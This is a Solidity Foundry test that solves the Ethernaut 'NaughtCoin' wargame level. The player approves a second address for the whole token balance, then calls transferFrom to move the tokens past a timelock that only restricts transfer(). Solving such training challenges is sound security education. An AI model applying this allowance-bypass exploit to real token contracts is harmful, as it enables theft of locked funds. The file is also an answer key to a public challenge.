// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import {Vm} from "forge-std/vm.sol";
import "../src/levels/NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";
import "../src/levels/NaughtCoin/NaughtCoin.sol";

contract NaughtCoinTest is DSTest {
    Ethernaut ethernaut;
    NaughtCoinFactory naughtCoinFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);
    address spender = address(96);

    function setUp() public {
        ethernaut = new Ethernaut();
        naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
    }

    function testIsNaughtCoinCleared() public {
        vm.startPrank(eoa);
        address instance = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin naughtCoin = NaughtCoin(instance);

        uint256 amount = naughtCoin.balanceOf(eoa);
        naughtCoin.approve(spender, amount);
        vm.stopPrank();

        vm.prank(spender);
        naughtCoin.transferFrom(eoa, spender, amount);

        vm.startPrank(eoa);
        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
        vm.stopPrank();
    }
}
